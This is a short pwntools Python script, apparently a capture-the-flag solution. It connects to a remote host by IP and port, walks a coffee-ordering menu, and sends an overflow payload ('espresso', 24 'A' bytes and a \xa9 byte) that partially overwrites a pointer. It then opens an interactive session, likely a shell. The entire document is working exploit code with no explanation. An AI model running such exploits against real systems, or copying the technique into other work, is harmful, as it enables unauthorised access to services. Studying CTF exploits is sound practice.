from pwn import *

c = remote("57.128.112.118", 13808)
c.sendlineafter(b"> ", b"1")
c.sendlineafter(b"> ", b"1")
c.sendlineafter(b"> ", b"2")
c.recvuntil(b"double espresso):")
c.send(b"espresso" + b"A"*24 + b"\xa9")
c.sendlineafter(b"> ", b"3")

c.interactive()